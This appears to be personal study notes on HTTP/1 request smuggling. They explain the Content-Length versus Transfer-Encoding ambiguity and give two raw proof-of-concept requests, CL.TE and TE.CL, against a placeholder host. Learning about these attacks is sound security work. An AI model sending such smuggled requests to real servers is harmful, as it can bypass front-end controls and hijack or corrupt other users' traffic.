# HTTP/1 Request Smuggling
Requests first go through a load balancer/reverse proxy/front end, and then get sent to a back end server. If there are inconsistencies between the calculation of the length og the requests, it allows for HTTP request smuggling.

![Request smuggling schematic](../images/Request_smuggling.png)

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header. `Transfer-Encoding: chunked`, each chunk looks like this:
```
| size (Bytes in hex) | newline | contents |
```
The message is terminated with a chunk of size zero.

> HTTP/2 is kinda immune to ambigious request length



## Proof of Concepts

### CL.TE
This is the HTTP request
```
POST / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL
This is the HTTP request
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```